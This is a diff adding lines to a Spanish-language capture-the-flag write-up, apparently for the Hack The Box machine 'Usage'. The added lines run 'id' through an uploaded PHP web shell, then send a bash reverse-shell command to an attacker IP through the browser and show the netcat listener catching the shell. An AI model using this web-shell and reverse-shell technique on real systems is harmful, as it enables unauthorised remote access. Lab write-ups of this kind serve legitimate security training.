@@ -192,7 +192,25 @@ Volviendo a nuestro navegador web, veremos que ha subido el fichero correctament
     <img src="imagenes/usage_6.png" alt="usage_6" width="500"  />
 </p>
 
+Realizamos una prueba de concepto, intentando ejecutar el comando id, y vemos que obteneroms el resultado esperado.
+<p align="left">
+    <img src="imagenes/usage_8.png" alt="usage_8" width="500"  />
+</p>
 
+Ahora, intentaremos ganar acceso a la máquina con una reverse shell. Para ello, nos ponemos en ecucha con netcat en nuestra máquina de atacante y ejecutamos la siguiente llamada en el navegador.
+```bash
+http://admin.usage.htb/uploads/images/pwned.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261'
+```
+
+En nuestra máquina de atacante, obtendriamos la reverse shell que estábamos esperando.
+```bash
+# nc -nlvp 443     
+listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.11.18] 45074
+bash: cannot set terminal process group (1225): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ 
+```
 <br>
 
 # Movimiento lateral
